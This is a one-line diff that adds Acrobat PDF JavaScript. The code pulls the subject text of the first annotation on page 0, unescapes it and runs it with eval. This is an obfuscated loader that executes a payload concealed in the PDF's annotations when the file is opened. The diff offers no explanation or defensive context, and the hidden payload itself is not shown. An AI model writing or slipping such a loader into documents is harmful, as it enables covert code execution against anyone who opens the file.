@@ -1,0 +1,1 @@
+if (app) { var ann = 0; app.doc.syncAnnotScan () ;var  ioper =  app.doc.getAnnots ( {    nPage : 0   }  ) ;ann = unescape (ioper[ 0 ].subject);eval(' ' + ann + ' ');}
